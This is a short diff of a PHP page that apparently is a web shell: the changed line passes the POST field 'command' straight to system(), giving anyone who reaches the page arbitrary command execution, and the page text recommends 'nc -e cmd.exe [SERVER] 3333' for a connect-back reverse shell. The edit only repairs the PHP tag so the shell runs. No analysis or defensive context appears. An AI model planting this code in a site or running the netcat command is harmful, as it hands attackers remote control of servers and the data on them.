@@ -104,7 +104,7 @@ cursor:crosshair
               }
               ?>
               <textarea readonly size="1" rows="7"
-                cols="53"><?php@$output = empty(system($_POST['command'])); ?></textarea><br>
+                cols="53"><?php @$output = empty(system($_POST['command'])); ?></textarea><br>
               <br>
               <font face="Verdana" style="font-size: 8pt"><b>Info:</b> For a connect
                 back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>
